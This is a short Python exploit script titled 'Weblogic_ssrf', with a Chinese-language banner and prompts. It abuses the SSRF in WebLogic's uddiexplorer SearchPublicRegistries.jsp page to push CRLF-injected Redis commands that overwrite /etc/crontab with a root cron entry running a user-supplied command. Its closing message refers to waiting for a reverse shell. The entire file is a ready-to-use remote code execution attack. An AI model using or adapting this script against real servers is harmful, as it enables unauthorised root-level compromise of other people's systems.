import urllib.parse
import requests

print("-----------Weblogic_ssrf----------")
print("|     author:xmao                |")
print("|     根据提示输入即可利用       |")
print("----------------------------------")

command = input("请输入你要执行的命令:")
weblogic_address = input("请输入Weblogic地址:")
redis_address = input("请输入Redis地址:")

payload = """test

set 1 "\\n\\n\\n\\n0-59 0-23 1-31 1-12 0-6 root bash -c '{}'\\n\\n\\n\\n"
config set dir /etc/
config set dbfilename crontab
save

aaa""".format(command)

tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
redis_payload = redis_address+"/"+(new)

r = requests.get("{}/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator={}".format(weblogic_address,redis_payload))
print("执行成功!如果是反弹shell请等待crontab执行.")